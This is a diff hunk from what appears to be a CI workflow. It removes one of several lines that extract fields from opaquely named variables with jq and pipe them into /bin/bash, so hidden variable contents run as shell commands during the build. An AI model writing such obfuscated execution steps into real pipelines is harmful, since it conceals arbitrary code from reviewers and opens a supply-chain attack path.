@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$str4" | jq -r .tnaxm2 | /bin/bash
           echo $hrbp6245 | jq -r .h6 | /bin/bash
-          printf '%s' "$y3" | jq -r .eo5904 | /bin/bash
           echo $pdpv30 | jq -r .ihlg3 | /bin/bash
 
       - name: Save archive
